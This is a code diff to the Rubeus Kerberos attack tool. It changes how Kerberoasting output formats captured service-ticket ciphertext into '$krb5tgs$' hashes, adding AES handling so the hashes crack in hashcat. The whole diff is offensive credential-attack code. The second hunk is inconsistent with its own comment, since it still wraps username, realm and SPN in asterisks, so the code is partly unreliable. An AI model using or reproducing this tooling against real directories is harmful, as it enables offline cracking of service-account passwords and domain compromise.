@@ -737,10 +737,22 @@ namespace Rubeus
                                     {
                                         byte[] cipherTextBytes = elem3.Sub[0].GetOctetString();
                                         string cipherText = BitConverter.ToString(cipherTextBytes).Replace("-", "");
-
-                                        string hash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encType, userName, domain, spn, cipherText.Substring(0, 32), cipherText.Substring(32));
-
-                                        if (!String.IsNullOrEmpty(outFile))
+                                        string hash="";
+                                        
+                                        if ((encType==18) || (encType==17))
+                                        {
+                                            //Ensure checksum is extracted from the end for aes keys
+                                            int checksumStart =cipherText.Length-24;
+                                            //Enclose SPN in *s rather than username, realm and SPN. This doesn't impact cracking, but might affect loading into hashcat.
+                                            hash = String.Format("$krb5tgs${0}${1}${2}$*{3}*${4}${5}", encType, userName, domain, spn, cipherText.Substring(checksumStart), cipherText.Substring(0,checksumStart));
+                                        }
+                                        //if encType==23
+                                        else
+                                        {
+                                            hash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encType, userName, domain, spn, cipherText.Substring(0, 32), cipherText.Substring(32));
+                                        }
+            
+	    				if (!String.IsNullOrEmpty(outFile))
                                         {
                                             string outFilePath = Path.GetFullPath(outFile);
                                             try
@@ -839,9 +851,22 @@ namespace Rubeus
             string sname = string.Join("/", cred.enc_part.ticket_info[0].sname.name_string.ToArray());
 
             string cipherText = BitConverter.ToString(cred.tickets[0].enc_part.cipher).Replace("-", string.Empty);
-            string hash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encType, kerberoastUser, kerberoastDomain, sname, cipherText.Substring(0, 32), cipherText.Substring(32));
-
-            if (!String.IsNullOrEmpty(outFile))
+          
+            string hash = "";
+            //Aes needs to be treated differently, as the checksum is the last 24, not the first 32.
+            if ((encType == 18) || (encType == 17))
+            {
+                int checksumStart = cipherText.Length - 24;
+                //Enclose SPN in *s rather than username, realm and SPN. This doesn't impact cracking, but might affect loading into hashcat.            
+                hash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encType, kerberoastUser, kerberoastDomain, sname, cipherText.Substring(checksumStart), cipherText.Substring(0, checksumStart));
+            }
+            //if encType==23
+            else
+            {
+                hash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encType, kerberoastUser, kerberoastDomain, sname, cipherText.Substring(0, 32), cipherText.Substring(32));
+            }
+            
+	    if (!String.IsNullOrEmpty(outFile))
             {
                 string outFilePath = Path.GetFullPath(outFile);
                 try
